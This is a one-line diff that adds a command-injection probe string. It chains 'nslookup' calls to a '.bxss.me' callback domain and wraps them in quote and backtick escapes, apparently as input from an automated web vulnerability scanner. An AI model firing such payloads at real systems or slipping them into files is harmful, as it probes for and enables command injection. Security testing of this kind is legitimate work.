@@ -1,0 +1,1 @@
+&nslookup -q=cname hitnbmtcmyqrq59d49.bxss.me&'\"`0&nslookup -q=cname hitnbmtcmyqrq59d49.bxss.me&`'
